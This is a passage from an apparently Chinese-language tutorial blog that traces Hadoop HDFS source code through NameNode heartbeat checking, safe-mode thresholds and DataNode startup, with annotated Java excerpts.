&#123;</span><br><span class="line">      LOG.error(<span class="string">"Exception while checking heartbeat"</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Thread.sleep(<span class="number">5000</span>);  <span class="comment">// 5 seconds</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// avoid declaring nodes dead for another cycle if a GC pause lasts</span></span><br><span class="line">    <span class="comment">// longer than the node recheck interval</span></span><br><span class="line">    <span class="keyword">if</span> (shouldAbortHeartbeatCheck(-<span class="number">5000</span>)) &#123;</span><br><span class="line">      LOG.warn(<span class="string">"Skipping next heartbeat scan due to excessive pause"</span>);</span><br><span class="line">      lastHeartbeatCheck = Time.monotonicNow();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heartbeatCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> DatanodeManager dm = blockManager.getDatanodeManager();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">boolean</span> allAlive = <span class="keyword">false</span>;</span><br><span class="line">  <span class="keyword">while</span> (!allAlive) &#123;</span><br><span class="line">    <span class="comment">// locate the first dead node.</span></span><br><span class="line">    DatanodeDescriptor dead = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// locate the first failed storage that isn't on a dead node.</span></span><br><span class="line">    DatanodeStorageInfo failedStorage = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check the number of stale nodes</span></span><br><span class="line">    <span class="keyword">int</span> numOfStaleNodes = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> numOfStaleStorages = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (DatanodeDescriptor d : datanodes) &#123;</span><br><span class="line">        <span class="comment">// check if an excessive GC pause has occurred</span></span><br><span class="line">        <span class="keyword">if</span> (shouldAbortHeartbeatCheck(<span class="number">0</span>)) &#123;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// 判断DN节点是否挂断</span></span><br><span class="line">        <span class="keyword">if</span> (dead == <span class="keyword">null</span> &amp;&amp; dm.isDatanodeDead(d)) &#123;</span><br><span class="line">          stats.incrExpiredHeartbeats();</span><br><span class="line">          dead = d;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (d.isStale(dm.getStaleInterval())) &#123;</span><br><span class="line">          numOfStaleNodes++;</span><br><span class="line">        &#125;</span><br><span class="line">        DatanodeStorageInfo[] storageInfos = d.getStorageInfos();</span><br><span class="line">        <span class="keyword">for</span>(DatanodeStorageInfo storageInfo : storageInfos) &#123;</span><br><span class="line">          <span class="keyword">if</span> (storageInfo.areBlockContentsStale()) &#123;</span><br><span class="line">            numOfStaleStorages++;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (failedStorage == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">              storageInfo.areBlocksOnFailedStorage() &amp;&amp;</span><br><span class="line">              d != dead) &#123;</span><br><span class="line">            failedStorage = storageInfo;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// Set the number of stale nodes in the DatanodeManager</span></span><br><span class="line">      dm.setNumStaleNodes(numOfStaleNodes);</span><br><span class="line">      dm.setNumStaleStorages(numOfStaleStorages);</span><br><span class="line">    &#125;</span><br><span class="line">    ... ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isDatanodeDead</span><span class="params">(DatanodeDescriptor node)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (node.getLastUpdateMonotonic() &lt;</span><br><span class="line">          (monotonicNow() - heartbeatExpireInterval));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> heartbeatExpireInterval;</span><br><span class="line"><span class="comment">// 10分钟 + 30秒</span></span><br><span class="line"><span class="keyword">this</span>.heartbeatExpireInterval = <span class="number">2</span> * heartbeatRecheckInterval + <span class="number">10</span> * <span class="number">1000</span> * heartbeatIntervalSeconds;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">int</span> heartbeatRecheckInterval;</span><br><span class="line">heartbeatRecheckInterval = conf.getInt(</span><br><span class="line">        DFSConfigKeys.DFS_NAMENODE_HEARTBEAT_RECHECK_INTERVAL_KEY, </span><br><span class="line">        DFSConfigKeys.DFS_NAMENODE_HEARTBEAT_RECHECK_INTERVAL_DEFAULT); <span class="comment">// 5 minutes</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">long</span> heartbeatIntervalSeconds;</span><br><span class="line">heartbeatIntervalSeconds = conf.getTimeDuration(</span><br><span class="line">        DFSConfigKeys.DFS_HEARTBEAT_INTERVAL_KEY,</span><br><span class="line">        DFSConfigKeys.DFS_HEARTBEAT_INTERVAL_DEFAULT, TimeUnit.SECONDS);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span>    DFS_HEARTBEAT_INTERVAL_DEFAULT = <span class="number">3</span>;</span><br></pre></td></tr></table></figure><h2 id="7、安全模式">7、安全模式</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">startCommonServices</span><span class="params">(Configuration conf, HAContext haContext)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.registerMBean(); <span class="comment">// register the MBean for the FSNamesystemState</span></span><br><span class="line">  writeLock();</span><br><span class="line">  <span class="keyword">this</span>.haContext = haContext;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    nnResourceChecker = <span class="keyword">new</span> NameNodeResourceChecker(conf);</span><br><span class="line">    <span class="comment">// 检查是否有足够的磁盘存储元数据（fsimage（默认100m） editLog（默认100m））</span></span><br><span class="line">    checkAvailableResources();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> !blockManager.isPopulatingReplQueues();</span><br><span class="line">    StartupProgress prog = NameNode.getStartupProgress();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开始进入安全模式</span></span><br><span class="line">    prog.beginPhase(Phase.SAFEMODE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取所有可以正常使用的block</span></span><br><span class="line"><span class="keyword">long</span> completeBlocksTotal = getCompleteBlocksTotal();</span><br><span class="line"></span><br><span class="line">    prog.setTotal(Phase.SAFEMODE, STEP_AWAITING_REPORTED_BLOCKS,</span><br><span class="line">        completeBlocksTotal);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动块服务</span></span><br><span class="line">    blockManager.activate(conf, completeBlocksTotal);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    writeUnlock(<span class="string">"startCommonServices"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  registerMXBean();</span><br><span class="line">  DefaultMetricsSystem.instance().register(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">if</span> (inodeAttributeProvider != <span class="keyword">null</span>) &#123;</span><br><span class="line">    inodeAttributeProvider.start();</span><br><span class="line">    dir.setINodeAttributeProvider(inodeAttributeProvider);</span><br><span class="line">  &#125;</span><br><span class="line">  snapshotManager.registerMXBean();</span><br><span class="line">  InetSocketAddress serviceAddress = NameNode.getServiceAddress(conf, <span class="keyword">true</span>);</span><br><span class="line">  <span class="keyword">this</span>.nameNodeHostName = (serviceAddress != <span class="keyword">null</span>) ?</span><br><span class="line">      serviceAddress.getHostName() : <span class="string">""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击getCompleteBlocksTotal</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getCompleteBlocksTotal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Calculate number of blocks under construction</span></span><br><span class="line">  <span class="keyword">long</span> numUCBlocks = <span class="number">0</span>;</span><br><span class="line">  readLock();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 获取正在构建的block</span></span><br><span class="line">    numUCBlocks = leaseManager.getNumUnderConstructionBlocks();</span><br><span class="line">  <span class="comment">// 获取所有的块 - 正在构建的block = 可以正常使用的block</span></span><br><span class="line">    <span class="keyword">return</span> getBlocksTotal() - numUCBlocks;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    readUnlock(<span class="string">"getCompleteBlocksTotal"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击activate</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">activate</span><span class="params">(Configuration conf, <span class="keyword">long</span> blockTotal)</span> </span>&#123;</span><br><span class="line">  pendingReconstruction.start();</span><br><span class="line">  datanodeManager.activate(conf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.redundancyThread.setName(<span class="string">"RedundancyMonitor"</span>);</span><br><span class="line">  <span class="keyword">this</span>.redundancyThread.start();</span><br><span class="line"></span><br><span class="line">  storageInfoDefragmenterThread.setName(<span class="string">"StorageInfoMonitor"</span>);</span><br><span class="line">  storageInfoDefragmenterThread.start();</span><br><span class="line">  <span class="keyword">this</span>.blockReportThread.start();</span><br><span class="line"></span><br><span class="line">  mxBeanName = MBeans.register(<span class="string">"NameNode"</span>, <span class="string">"BlockStats"</span>, <span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">  bmSafeMode.activate(blockTotal);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">activate</span><span class="params">(<span class="keyword">long</span> total)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">assert</span> namesystem.hasWriteLock();</span><br><span class="line">  <span class="keyword">assert</span> status == BMSafeModeStatus.OFF;</span><br><span class="line"></span><br><span class="line">  startTime = monotonicNow();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 计算是否满足块个数的阈值</span></span><br><span class="line">  setBlockTotal(total);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断DataNode节点和块信息是否达到退出安全模式标准</span></span><br><span class="line">  <span class="keyword">if</span> (areThresholdsMet()) &#123;</span><br><span class="line">    <span class="keyword">boolean</span> exitResult = leaveSafeMode(<span class="keyword">false</span>);</span><br><span class="line">    Preconditions.checkState(exitResult, <span class="string">"Failed to leave safe mode."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// enter safe mode</span></span><br><span class="line">status = BMSafeModeStatus.PENDING_THRESHOLD;</span><br><span class="line"></span><br><span class="line">initializeReplQueuesIfNecessary();</span><br><span class="line"></span><br><span class="line">    reportStatus(<span class="string">"STATE* Safe mode ON."</span>, <span class="keyword">true</span>);</span><br><span class="line">    lastStatusReport = monotonicNow();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击setBlockTotal</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setBlockTotal</span><span class="params">(<span class="keyword">long</span> total)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">assert</span> namesystem.hasWriteLock();</span><br><span class="line">  <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.blockTotal = total;</span><br><span class="line">  <span class="comment">// 计算阈值：例如：1000个正常的块 * 0.999 = 999</span></span><br><span class="line">    <span class="keyword">this</span>.blockThreshold = (<span class="keyword">long</span>) (total * threshold);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">this</span>.blockReplQueueThreshold = (<span class="keyword">long</span>) (total * replQueueThreshold);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.threshold = conf.getFloat(DFS_NAMENODE_SAFEMODE_THRESHOLD_PCT_KEY,</span><br><span class="line">        DFS_NAMENODE_SAFEMODE_THRESHOLD_PCT_DEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">float</span>   DFS_NAMENODE_SAFEMODE_THRESHOLD_PCT_DEFAULT = <span class="number">0.999f</span>;</span><br></pre></td></tr></table></figure><p>点击areThresholdsMet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">areThresholdsMet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">assert</span> namesystem.hasWriteLock();</span><br><span class="line">  <span class="comment">// Calculating the number of live datanodes is time-consuming</span></span><br><span class="line">  <span class="comment">// in large clusters. Skip it when datanodeThreshold is zero.</span></span><br><span class="line">  <span class="keyword">int</span> datanodeNum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (datanodeThreshold &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    datanodeNum = blockManager.getDatanodeManager().getNumLiveDataNodes();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">  <span class="comment">// 已经正常注册的块数 》= 块的最小阈值 》=最小可用DataNode</span></span><br><span class="line">    <span class="keyword">return</span> blockSafe &gt;= blockThreshold &amp;&amp; datanodeNum &gt;= datanodeThreshold;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>三、DataNode启动源码解析</h1><h2 id="1、概述-v2">1、概述</h2><p>工作机制</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335071.png" alt></p><p>启动源码流程</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335072.png" alt></p><p>查找DataNode.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (DFSUtil.parseHelpArgument(args, DataNode.USAGE, System.out, <span class="keyword">true</span>)) &#123;</span><br><span class="line">    System.exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  secureMain(args, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">secureMain</span><span class="params">(String args[], SecureResources resources)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> errorCode = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    StringUtils.startupShutdownMessage(DataNode<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>, <span class="title">LOG</span>)</span>;</span><br><span class="line"></span><br><span class="line">    DataNode datanode = createDataNode(args, <span class="keyword">null</span>, resources);</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    LOG.error(<span class="string">"Exception in secureMain"</span>, e);</span><br><span class="line">    terminate(<span class="number">1</span>, e);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    LOG.warn(<span class="string">"Exiting Datanode"</span>);</span><br><span class="line">    terminate(errorCode);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> DataNode <span class="title">createDataNode</span><span class="params">(String args[], Configuration conf,</span></span></span><br><span class="line"><span class="function"><span class="params">    SecureResources resources)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">// 初始化DN</span></span><br><span class="line">  DataNode dn = instantiateDataNode(args, conf, resources);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dn != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 启动DN进程</span></span><br><span class="line">    dn.runDatanodeDaemon();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> DataNode <span class="title">instantiateDataNode</span><span class="params">(String args [], Configuration conf,</span></span></span><br><span class="line"><span class="function"><span class="params">    SecureResources resources)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> makeInstance(dataLocations, conf, resources);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> DataNode <span class="title">makeInstance</span><span class="params">(Collection&lt;StorageLocation&gt; dataDirs,</span></span></span><br><span class="line"><span class="function"><span class="params">    Configuration conf, SecureResources resources)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> DataNode(conf, locations, storageLocationChecker, resources);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DataNode(<span class="keyword">final</span> Configuration conf,</span><br><span class="line">         <span class="keyword">final</span> List&lt;StorageLocation&gt; dataDirs,</span><br><span class="line">         <span class="keyword">final</span> StorageLocationChecker storageLocationChecker,</span><br><span class="line">         <span class="keyword">final</span> SecureResources resources) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  <span class="keyword">super</span>(conf);</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    hostName = getHostName(conf);</span><br><span class="line">    LOG.info(<span class="string">"Configured hostname is &#123;&#125;"</span>, hostName);</span><br><span class="line">  <span class="comment">// 启动DN</span></span><br><span class="line">    startDataNode(dataDirs, resources);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (IOException ie) &#123;</span><br><span class="line">    shutdown();</span><br><span class="line">    <span class="keyword">throw</span> ie;</span><br><span class="line">  &#125;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">startDataNode</span><span class="params">(List&lt;StorageLocation&gt; dataDirectories,</span></span></span><br><span class="line"><span class="function"><span class="params">                   SecureResources resources</span></span></span><br><span class="line"><span class="function"><span class="params">                   )</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="comment">// 创建数据存储对象</span></span><br><span class="line">  storage = <span class="keyword">new</span> DataStorage();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// global DN settings</span></span><br><span class="line">  registerMXBean();</span><br><span class="line">  <span class="comment">// 初始化DataXceiver</span></span><br><span class="line">  initDataXceiver();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 启动HttpServer</span></span><br><span class="line">  startInfoServer();</span><br><span class="line"></span><br><span class="line">  pauseMonitor = <span class="keyword">new</span> JvmPauseMonitor();</span><br><span class="line">  pauseMonitor.init(getConf());</span><br><span class="line">  pauseMonitor.start();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// BlockPoolTokenSecretManager is required to create ipc server.</span></span><br><span class="line">  <span class="keyword">this</span>.blockPoolTokenSecretManager = <span class="keyword">new</span> BlockPoolTokenSecretManager();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Login is done by now. Set the DN user name.</span></span><br><span class="line">  dnUserName = UserGroupInformation.getCurrentUser().getUserName();</span><br><span class="line">  LOG.info(<span class="string">"dnUserName = &#123;&#125;"</span>, dnUserName);</span><br><span class="line">  LOG.info(<span class="string">"supergroup = &#123;&#125;"</span>, supergroup);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 初始化RPC服务</span></span><br><span class="line">  initIpcServer();</span><br><span class="line"></span><br><span class="line">  metrics = DataNodeMetrics.create(getConf(), getDisplayName());</span><br><span class="line">  peerMetrics = dnConf.peerStatsEnabled ?</span><br><span class="line">      DataNodePeerMetrics.create(getDisplayName(), getConf()) : <span class="keyword">null</span>;</span><br><span class="line">  metrics.getJvmMetrics().setPauseMonitor(pauseMonitor);</span><br><span class="line"></span><br><span class="line">  ecWorker = <span class="keyword">new</span> ErasureCodingWorker(getConf(), <span class="keyword">this</span>);</span><br><span class="line">  blockRecoveryWorker = <span class="keyword">new</span> BlockRecoveryWorker(<span class="keyword">this</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 创建BlockPoolManager</span></span><br><span class="line">  blockPoolManager = <span class="keyword">new</span> BlockPoolManager(<span class="keyword">this</span>);</span><br><span class="line">  <span class="comment">// 心跳管理</span></span><br><span class="line">  blockPoolManager.refreshNamenodes(getConf());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create the ReadaheadPool from the DataNode context so we can</span></span><br><span class="line">  <span class="comment">// exit without having to explicitly shutdown its thread pool.</span></span><br><span class="line">  readaheadPool = ReadaheadPool.getInstance();</span><br><span class="line">  saslClient = <span class="keyword">new</span> SaslDataTransferClient(dnConf.getConf(),</span><br><span class="line">      dnConf.saslPropsResolver, dnConf.trustedChannelResolver);</span><br><span class="line">  saslServer = <span class="keyword">new</span> SaslDataTransferServer(dnConf, blockPoolTokenSecretManager);</span><br><span class="line">  startMetricsLogger();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dnConf.diskStatsEnabled) &#123;</span><br><span class="line">    diskMetrics = <span class="keyword">new</span> DataNodeDiskMetrics(<span class="keyword">this</span>,</span><br><span class="line">        dnConf.outliersReportIntervalMs);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2、初始化DataXceiverServer">2、初始化DataXceiverServer</h2><p>点击initDataXceiver</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initDataXceiver</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">// dataXceiverServer是一个服务，DN用来接收客户端和其他DN发送过来的数据服务</span></span><br><span class="line">  <span class="keyword">this</span>.dataXceiverServer = <span class="keyword">new</span> Daemon(threadGroup, xserver);</span><br><span class="line">  <span class="keyword">this</span>.threadGroup.setDaemon(<span class="keyword">true</span>); <span class="comment">// auto destroy when empty</span></span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、初始化HTTP服务">3、初始化HTTP服务</h2><p>点击startInfoServer();</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span 